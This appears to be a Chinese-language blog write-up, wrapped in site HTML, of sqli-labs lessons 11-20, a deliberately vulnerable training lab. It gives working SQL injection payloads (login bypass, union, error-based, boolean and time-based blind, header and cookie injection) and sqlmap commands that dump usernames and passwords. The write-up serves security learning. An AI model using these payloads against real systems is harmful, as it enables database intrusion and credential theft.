@@ -1,0 +1,315 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sqli-labs_11-20 | Ephemeral-fever</title><meta name="keywords" content="sql注入"><meta name="author" content="GeJian"><meta name="copyright" content="GeJian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Less-11进入后是个登录页面，应该是基于post的注入，这边准备用hackbar注入，方便一点。看一下源码，两个框的名字分别是uname和passwd  先提交1试试效果  登陆失败，再加一个单引号试试，密码框不输（若是输入密码，报错出来的信息更少；也可同时输入单双引号，这个效果一样）  有报错回显，存在注入，且回显的错误为：’1’’ and password&#x3D;’’ LIMIT 0,1。其中1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs_11-20">
+<meta property="og:url" content="http://example.com/2021/01/27/sqli-labs_11-20/index.html">
+<meta property="og:site_name" content="Ephemeral-fever">
+<meta property="og:description" content="Less-11进入后是个登录页面，应该是基于post的注入，这边准备用hackbar注入，方便一点。看一下源码，两个框的名字分别是uname和passwd  先提交1试试效果  登陆失败，再加一个单引号试试，密码框不输（若是输入密码，报错出来的信息更少；也可同时输入单双引号，这个效果一样）  有报错回显，存在注入，且回显的错误为：’1’’ and password&#x3D;’’ LIMIT 0,1。其中1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/pic8.jpg">
+<meta property="article:published_time" content="2021-01-27T07:21:39.000Z">
+<meta property="article:modified_time" content="2021-03-05T14:23:21.627Z">
+<meta property="article:author" content="GeJian">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/pic8.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/01/27/sqli-labs_11-20/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="yandex-verification" content="{&quot;enable&quot;:true}"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-05 22:23:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/head-sculpture.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/pic8.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ephemeral-fever</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">sqli-labs_11-20</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-27T07:21:39.000Z" title="发表于 2021-01-27 15:21:39">2021-01-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-05T14:23:21.627Z" title="更新于 2021-03-05 22:23:21">2021-03-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/sqli-labs/">sqli-labs</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>进入后是个登录页面，应该是基于post的注入，这边准备用hackbar注入，方便一点。看一下源码，两个框的名字分别是uname和passwd</p>
+<img src="/2021/01/27/sqli-labs_11-20/1.png" class>
+<p>先提交1试试效果</p>
+<img src="/2021/01/27/sqli-labs_11-20/2.png" class>
+<p>登陆失败，再加一个单引号试试，密码框不输（若是输入密码，报错出来的信息更少；也可同时输入单双引号，这个效果一样）</p>
+<img src="/2021/01/27/sqli-labs_11-20/3.png" class>
+<p>有报错回显，存在注入，且回显的错误为：’1’’ and password=’’ LIMIT 0,1。其中1’是我输进去的，另外还有成对的单引号出现，可以看出是字符型。由此猜测sql语句为：<code>select username, password from 某表 where username=&#39;用户输入&#39; and password=&#39;用户输入&#39; limit 0,1</code><br>根据之前的经验我们把后面注释掉，构造<code>1&#39; or 1 #</code>，其中#是注释符，or 1是为了让那个查询语句为真。</p>
+<img src="/2021/01/27/sqli-labs_11-20/4.png" class>
+<p>可以看到登录成功。因为报错有回显，我们可以利用联合查询的注入方式，类似Less-1到Less-4，这里不多赘述，给个效果图。</p>
+<img src="/2021/01/27/sqli-labs_11-20/5.png" class>
+<p>这里主要利用基于extractvalue()和updatexml()的报错注入<br>经过前面的试探可以确定有两列，联合查询能回显</p>
+<img src="/2021/01/27/sqli-labs_11-20/6.png" class>
+<p>extractvalue()有两个参数，当我们写入不合法的内容就会报错（合法不会显示），通过报错，可以将我想要查询的东西带出来。基于此我们查看当前数据库，构造uname<code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select database()))) #</code>或者<code>1&#39; and extractvalue(1,concat(0x7e,(select database()))) </code>，也就是说，报错注入可以不借助联合查询，在没法用union联合查询时可以用报错注入，但前提还是不能过滤一些关键的函数。其中0x7e是~，extractvalue()里第一个参数随意，我这里随便写了个1</p>
+<img src="/2021/01/27/sqli-labs_11-20/7.png" class>
+<p>可以看到当前数据库是security，和之前的经验一致。接下来看表名，构造uname<code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/8.png" class>
+<p>提交完发现提示不止一行，后面加个limit语句限制输出<code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limint 0,1))) #</code>通过更改limit第一个参数查看不同行</p>
+<img src="/2021/01/27/sqli-labs_11-20/9.png" class>
+<p>也可以这样构造：<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</code><br>查看后发现有个表叫users，下面查列名，构造uname<code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/10.png" class>
+<p>如法炮制一一看到列名，下面查具体数据，构造uname<code>1&#39; and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/11.png" class>
+<p>concat_ws也可以实现同样的效果，改成<code>concat_ws(0x3a,username,password)</code>即可。可以看到确实查出来了，但这样有点慢，下面换group_concat试试构造uname<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/12.png" class>
+<p>可以看到显示不全，那是因为extractvalue（）函数最多显示32位，于是可以用substring（）函数来截取，一段一段的看，构造uname<code>1&#39; and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/13.png" class>
+<p>substring函数第一个数字表示起始位置，第二个数字表示读取长度。</p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>惯例提交个1试试，显示登录失败。再提交1’试试，还是登录失败。那换1”试试</p>
+<img src="/2021/01/27/sqli-labs_11-20/14.png" class>
+<p>可以看到有报错回显，且回显信息为：”1””) and password=(“”) LIMIT 0,1。爆出来很多东西，可以猜测sql语句为：<code>select username, password from 某表 where username=(&quot;用户输入&quot;) and password=(&quot;用户输入&quot;) limit 0,1</code>，然后尝试闭合双引号和括号，并注释掉后面的内容，构造<code>1&quot;) #</code>提交</p>
+<img src="/2021/01/27/sqli-labs_11-20/15.png" class>
+<p>可以看到没有报错，说明语句执行了。接下来用order by 看看列数，order by 2显示登录失败，order by 3有报错回显 ，说明两列。接下来构造<code>1&quot;) or 1 #</code>看看登录成功会有什么效果，结果仍有回显。那么就试试联合查询，构造<code>1&quot;) union select 1,2 #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/16.png" class>
+<p>可以看到登录成功并且有回显。然后看数据库名，<code>1&quot;) union select 1,database() #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/17.png" class>
+<p>成功查到，然后表名，<code>1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/18.png" class>
+<p>成功查到，然后列名，<code>1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/19.png" class>
+<p>成功查到，然后具体数据，<code>1&quot;) union select 1,group_concat(username,0x3a,password) from users #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/20.png" class>
+<p>达成目的，整个流程和Less-1到4是差不多的，只不过那个是基于get方式，这个是基于post方式。</p>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>惯例提交个1试试，显示登录失败。再提交1’试试，有报错回显</p>
+<img src="/2021/01/27/sqli-labs_11-20/21.png" class>
+<p>回显信息为：’1’’) and password=(‘’) LIMIT 0,1，由此猜测sql语句为<code>select username, password from 某表 where username=(&#39;用户输入&#39;) and password=(&#39;用户输入&#39;) limit 0,1</code>，然后闭合单引号和括号登录看看效果，提交<code>1&#39;) #</code>，可以看到无报错，且登录失败。然后登录成功试试，构造<code>1&#39;) or 1#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/22.png" class>
+<p>可以看到登录成功但也没有回显，和前面不一样了，因此联合查询用不了了，因为即便查到了但它不显示出来有什么用呢。这里就需要用到报错注入。详见Less-11。构造<code>1&#39;) and extractvalue(1,concat(0x7e,(select database()))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/23.png" class>
+<p>成功爆出数据库名，然后构造<code>&#39;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/24.png" class>
+<p>成功爆出表名，然后构造<code>1&#39;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/25.png" class>
+<p>成功爆出列名，看到了username和password，然后构造<code>1&#39;) and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/27.png" class>
+<p>成功爆出，但是看不全，因为extractvalue只能显示32位，那就通过修改extractvalue函数的参数一段一段看：<br><code>1&#39;) and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),32,32))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/26.png" class>
+
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>惯例提交个1试试，显示登录失败。再提交1’试试，还是登录失败。那换1”试试</p>
+<img src="/2021/01/27/sqli-labs_11-20/28.png" class>
+<p>登录失败，且有报错回显：<code>&quot;1&quot;&quot; and password=&quot;&quot; LIMIT 0,1</code>,由此可以猜测sql语句为：<code>select username, password from 某表 where username=&quot;用户输入&quot; and password=&quot;用户输入&quot; limit 0,1</code>。然后闭合双引号并注释试试，构造<code>1&quot; #</code>,显示登录失败无报错，说明构造的语句执行了。然后构造<code>1&quot; or 1 #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/29.png" class>
+<p>登录成功但无回显，联合查询注入失效，利用报错注入。构造<code>1&quot; and extractvalue(1,concat(0x7e,(select database()))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/30.png" class>
+<p>成功爆出数据库名，然后构造<code>1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/31.png" class>
+<p>成功爆出表名，然后构造<code>1&quot; and extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,32))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/32.png" class>
+<p>成功看到列名，然后构造<code>1&quot; and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32))) #</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/33.png" class>
+<p>成功看到数据，大功告成。</p>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>随便输入1，2，显示登录失败，然后构造万能密码看看成功登录是什么样子。构造用户名<code>1&#39; or 1 #</code>（这里的单引号只是一次尝试，or 1让语句恒真，所以单引号那个位置的闭合符号决定了语句是否有误）</p>
+<img src="/2021/01/27/sqli-labs_11-20/48.png" class>
+<p>登录成功但啥也没显示，判断是盲注，因为有两种状态，布尔盲注即可。下面不过多叙述，仅列出语句<br>表名长度：<code>1&#39; or (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&gt;0 #</code><br>表名：<code>1&#39; or (select ascii(substr((group_concat(table_name)),1,1)) from information_schema.tables where table_schema=database())&gt;0 #</code><br>列名长度：<code>1&#39; or (select length(group_concat(column_name)) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;0 #</code><br>列名：<code>1&#39; or (select ascii(substr((group_concat(column_name)),1,1)) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;0 #</code><br>数据长度：<code>1&#39; or (select length(group_concat(username,0x3a,password)) from users)&gt;0 #</code><br>数据：<code>1&#39; or (select ascii(substr((group_concat(username,0x3a,password)),1,1)) from users)&gt;0 #</code><br>下面以列名为例看看用bp爆破的效果，和之前大同小异只不过爆破点设置在报文体中</p>
+<img src="/2021/01/27/sqli-labs_11-20/49.png" class>
+<p>找到后转成字符即可</p>
+<img src="/2021/01/27/sqli-labs_11-20/50.png" class>
+<p>下面利用sqlmap，随便输入用户名密码1，2，然后抓包，保存在一个txt文件中，这里我命名为1.txt，放在桌面上。从post数据包中注入命令为：<code>sqlmap -r 数据包存放路径 </code></p>
+<img src="/2021/01/27/sqli-labs_11-20/51.png" class>
+<p>可以看到成功探测到了，后续参数和之前一样，这里不多赘述。</p>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>此题和前一题类似，经过尝试需要闭合的符号为双引号和括号</p>
+<img src="/2021/01/27/sqli-labs_11-20/52.png" class>
+<p>可以进行布尔盲注，不过这里以时间盲注作为练习<br>表名长度：<code>1&quot;) or if((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&gt;0,sleep(1),0) #</code><br>表名：<code>1&quot;) or if((select ascii(substr((group_concat(table_name)),1,1)) from information_schema.tables where table_schema=database())&gt;0,sleep(1),0) #</code><br>列名长度：<code>1&quot;) or if((select length(group_concat(column_name)) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;0,sleep(1),0) #</code><br>列名：<code>1&quot;) or if((select ascii(substr((group_concat(column_name)),1,1)) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)&gt;0,sleep(1),0) #</code><br>数据长度：<code>1&quot;) or if((select length(group_concat(username,0x3a,password)) from users)&gt;0,sleep(1),0) #</code><br>数据：<code>1&quot;) or if((select ascii(substr((group_concat(username,0x3a,password)),1,1)) from users)&gt;0,sleep(1),0) #</code><br>利用sqlmap注入方法：抓包之后将报文复制到一个txt文件中，利用-r参数，后面接txt文件的路径，其他都一样。</p>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>进去之后可以看到，是想让我们修改密码。然后不管怎么尝试，无论在用户名框还是在密码框都没用。这时候可能就需要一个存在于数据库中的用户名，于是我们尝试admin用户名，密码为1’</p>
+<img src="/2021/01/27/sqli-labs_11-20/53.png" class>
+<p>可以看到有报错回显，说明注入点是密码框。再构造<code>1&#39;#</code>提交</p>
+<img src="/2021/01/27/sqli-labs_11-20/54.png" class>
+<p>没有报错，说明语句执行了，并且就是单引号闭合。成功无有用信息，报错却有，所以报错注入。构造<code>1&#39; and extractvalue(1,concat(0x7e,database()))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/55.png" class>
+<p>成功看到数据库，然后看表名：<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/56.png" class>
+<p>然后看列名：<code>1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/57.png" class>
+<p>然后看数据：<code>1&#39; and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),1,32) from users)))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/58.png" class>
+<p>却又有报错，然后尝试在子查询里面放查询语句，但也有另外的报错，目前我解不出来。</p>
+<h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>根据提示，是uagent注入。分析源码</p>
+<img src="/2021/01/27/sqli-labs_11-20/59.png" class>
+<p>User-Agent和数据库产生了交互，那么这里就有可能存在注入点。并且用户名和密码框都做了检查，很难注入。</p>
+<img src="/2021/01/27/sqli-labs_11-20/60.png" class>
+<p>所以我们尝试uagent注入，先成功登录，用户名密码都是admin，然后抓包。在uagent后面加一个单引号，发送。</p>
+<img src="/2021/01/27/sqli-labs_11-20/61.png" class>
+<p>有报错，报错信息为：192.168.3.10’, ‘admin’)可猜测sql语句为：INSERT INTO security.uagents (uagent, ip_address, username) VALUES (‘$uagent’, ‘$IP’, $uname)<br>于是可以构造：<code>&#39;,&#39;&#39;,&#39;&#39;)#</code><br>其中括号用于闭合，中间那两对单引号用于使列的个数匹配，因为#注释掉了后面所有。</p>
+<img src="/2021/01/27/sqli-labs_11-20/62.png" class>
+<p>没有报错，于是就可以在其中一对单引号的位置自由发挥了。然后报错注入，表名：<code>&#39;,&#39;&#39;,extractvalue(1,concat(0x7e,(select (substr((group_concat(table_name)),1,32)) from information_schema.tables where table_schema=database()))))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/63.png" class>
+<p>列名：<code>&#39;,&#39;&#39;,extractvalue(1,concat(0x7e,(select (substr((group_concat(column_name)),1,32)) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/64.png" class>
+<p>具体数据：<code>&#39;,&#39;&#39;,extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),1,32) from users limit 0,1))))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/65.png" class>
+<p>修改截取的长度即可一段一段看。<br>利用sqlmap注入方法：抓包之后将报文复制到一个txt文件中，利用-r参数，后面接txt文件的路径，其他都一样。</p>
+<h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器以此可以获得一些客户端信息。<br>根据上一题的经验，先成功登录进去。</p>
+<img src="/2021/01/27/sqli-labs_11-20/66.png" class>
+<p>回显了referer。然后抓包，根据提示是referer注入，惯例先加一个单引号。</p>
+<img src="/2021/01/27/sqli-labs_11-20/67.png" class>
+<p>报错信息为：192.168.3.10’)，不够多，那构造<code>&#39;1&quot;</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/68.png" class>
+<p>报错信息为：1”‘, ‘192.168.3.10’)，有个逗号，说明不止一列，并且中间的列是用单引号引起来，最外面有一层括号，构造：<code>&#39;,&#39;&#39;)#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/69.png" class>
+<p>可以看到没有报错，于是那对引号的位置我们就可以自由发挥了。基于报错有回显，我们用报错注入。<br>看表名：<code>&#39;,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/70.png" class>
+<p>看表名：<code>&#39;,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/71.png" class>
+<p>看数据：<code>&#39;,extractvalue(1,concat(0x7e,(select substring(group_concat(username,0x3a,password),1,32) from users))))#</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/72.png" class>
+<p>利用sqlmap注入方法：抓包之后将报文复制到一个txt文件中，利用-r参数，后面接txt文件的路径，其他都一样。</p>
+<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>此关考察cookie注入，首先输入用户名，密码（都是admin），登进去后发现页面是这样的：</p>
+<img src="/2021/01/27/sqli-labs_11-20/34.png" class>
+<p>可以看到给出了一些http报头，其中cookie是uname=admin。然后利用bp抓包，发送到repeater模块便于反复操作。</p>
+<img src="/2021/01/27/sqli-labs_11-20/35.png" class>
+<p>先来判断一下能否注入，在admin后面加一个单引号</p>
+<img src="/2021/01/27/sqli-labs_11-20/36.png" class>
+<p>可以看到有mysql的报错信息了，报错为：’admin’’ LIMIT 0,1，根据前面的经验，这是字符型。再构造<code>uname=admin&#39;--+</code>把后面注释掉。</p>
+<img src="/2021/01/27/sqli-labs_11-20/37.png" class>
+<p>没有报错信息了，接下来和前面的联合查询注入就一模一样了，只不过这里改的是cookie。利用order by 判断出有3列。<br>构造<code>uname=admin&#39; and 0 union select 1,2,3--+</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/38.png" class>
+<p>看当前数据库（也可以省略，因为可以利用database()函数）：<code>uname=admin&#39; and 0 union select 1,2,database()--+</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/39.png" class>
+<p>看表名：<code>uname=admin&#39; and 0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/40.png" class>
+<p>看列名：<code>uname=admin&#39; and 0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/41.png" class>
+<p>看具体数据：<code>uname=admin&#39; and 0 union select 1,2,group_concat(username,0x3a,password) from users --+</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/42.png" class>
+<p>由此可见，只是注入位置不一样，其他都是大同小异。<br>下面介绍利用sqlmap实现cookie注入：<br>根据前面抓包得出的信息，cookie内容为：uname=admin<br>然后就可以进行探测了，命令为：<code>sqlmap -u 需要探测的url -cookie &quot;uname=admin&quot; -level 2</code>只有level达到2才会检测cookie。</p>
+<img src="/2021/01/27/sqli-labs_11-20/43.png" class>
+<p>可以看到探测成功，然后看当前数据库，命令为：<code>sqlmap -u 需要探测的url -cookie &quot;uname=admin&quot; -level 2 -current-db</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/44.png" class>
+<p>数据库为security，然后查看表，命令为：<code>sqlmap -u 需要探测的url -cookie &quot;uname=admin&quot; -level 2 -D security -tables</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/45.png" class>
+<p>选定目标表，查看列，命令为：<code>sqlmap -u 需要探测的url -cookie &quot;uname=admin&quot; -level 2 -D security -T users -columns</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/46.png" class>
+<p>看具体数据，命令为：<code>sqlmap -u 需要探测的url -cookie &quot;uname=admin&quot; -level 2 -D security -T users -C &quot;id,username,password&quot; -dump</code></p>
+<img src="/2021/01/27/sqli-labs_11-20/47.png" class>
+
+
+
+
